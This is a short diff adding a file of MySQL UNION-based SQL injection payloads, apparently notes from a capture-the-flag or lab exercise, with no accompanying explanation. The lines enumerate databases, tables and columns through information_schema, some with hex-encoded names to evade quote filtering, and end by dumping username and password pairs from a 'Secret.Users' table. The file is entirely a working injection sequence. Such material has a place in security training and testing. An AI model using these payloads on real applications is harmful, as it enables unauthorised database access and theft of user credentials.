@@ -1,0 +1,9 @@
+plans union select 1,schema_name,3,4,5 from information_schema.schemata#
+
+plans union select 1,table_name,3,4,5 from information_schema.tables where table_schema="Secret"#
+plans union select 1,table_name,3,4,5 from information_schema.tables where table_schema=0x536563726574#
+
+plans union select 1,column_name,3,4,5 from information_schema.columns where table_schema="Secret" and table_name="Users"#
+plans union select 1,column_name,3,4,5 from information_schema.columns where table_schema=0x536563726574 and table_name=0x5573657273#
+
+plans union select 1,concat(Username,0x3a,Password),3,4,5 from Secret.Users#
